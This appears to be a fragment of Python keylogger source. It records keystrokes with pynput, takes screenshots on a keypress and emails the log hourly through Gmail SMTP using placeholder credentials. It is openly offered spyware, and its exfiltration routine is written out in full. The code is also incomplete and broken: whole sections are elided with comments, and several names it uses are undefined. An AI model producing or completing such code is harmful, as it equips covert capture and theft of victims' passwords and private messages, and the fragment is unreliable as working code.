import platform
from pynput import keyboard
import time
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import os

log_file = 'keystrokes_log.txt'
screenshot_folder = 'screenshots/'
email_interval = 3600  # Send email every 1 hour

current_word = ""
current_line = ""

def on_key_press(key):
    global current_word, current_line

    # ... (same as before)

    if len(current_line) >= 50:
        save_current_line()

    if key == screenshot_key:
        capture_screenshot()

    if time.time() - last_email_time > email_interval:
        send_email(log_file)
        last_email_time = time.time()

def send_email(attachment_path):
    sender_email = "your_email@gmail.com"
    receiver_email = "recipient_email@gmail.com"
    subject = "Keystrokes Log"
    body = "Please find the attached keystrokes log."

    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg["Subject"] = subject

    msg.attach(MIMEText(body, "plain"))

    with open(attachment_path, "rb") as attachment:
        part = MIMEApplication(attachment.read(), Name=os.path.basename(attachment_path))
        part["Content-Disposition"] = f'attachment; filename="{os.path.basename(attachment_path)}"'
        msg.attach(part)

    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    smtp_username = "your_email@gmail.com"
    smtp_password = "your_email_password"

    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_username, smtp_password)
    server.sendmail(sender_email, receiver_email, msg.as_string())
    server.quit()

# Set up key listener
key_listener = keyboard.Listener(on_press=on_key_press)
key_listener.start()

# Rest of the code remains unchanged
